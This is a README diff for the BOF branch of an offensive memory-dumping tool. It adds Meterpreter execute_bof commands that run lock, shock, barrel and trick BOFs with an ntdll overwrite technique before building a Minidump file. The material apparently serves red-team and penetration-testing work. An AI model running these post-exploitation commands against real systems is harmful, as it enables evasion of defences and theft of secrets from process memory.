@@ -2,7 +2,7 @@
 
 This branch implements the same functionality as the main branch but using BOFs (Beacon Object Files).
 
-You can execute the files using Cobalt Strike or TrustedSec's [COFFLoader](https://github.com/trustedsec/COFFLoader):
+You can execute the files using Cobalt Strike, TrustedSec's [COFFLoader](https://github.com/trustedsec/COFFLoader) or Meterpreter's execute_bof:
 
 ```
 COFFLoader64.exe go lock_bof.o <OVERWRITE_TECHNIQUE>
@@ -94,3 +94,32 @@ COFFLoader64.exe go trick_bof.o 0e0000000a0000006400690073006b000000
 Then you can create the Minidump file using *create_dump.py*:
 
 ![img6](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/trickdump/Screenshot_BOF6.png)
+
+--------------------------------------
+
+## Using Meterpreter
+
+You can run BOFs in your Meterpreter sessions after loading the [execute_bof](https://docs.metasploit.com/docs/using-metasploit/advanced/meterpreter/meterpreter-executebof-command.html) module, using "--format-string Z <technique>" to use a ntdll overwrite technique:
+
+```
+load bofloader
+execute_bof lock_bof.o <OVERWRITE_TECHNIQUE>
+execute_bof shock_bof.o <OVERWRITE_TECHNIQUE>
+execute_bof barrel_bof.o <OVERWRITE_TECHNIQUE>
+```
+
+![img11](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/trickdump/Screenshot_BOF11.png)
+
+Then create the Minidump file:
+
+![img12](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/trickdump/Screenshot_BOF12.png)
+
+The same happens with the Trick BOF:
+
+```
+execute_bof trick_bof.o <OVERWRITE_TECHNIQUE>
+```
+
+![img13](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/trickdump/Screenshot_BOF13.png)
+
+![img14](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/trickdump/Screenshot_BOF14.png)
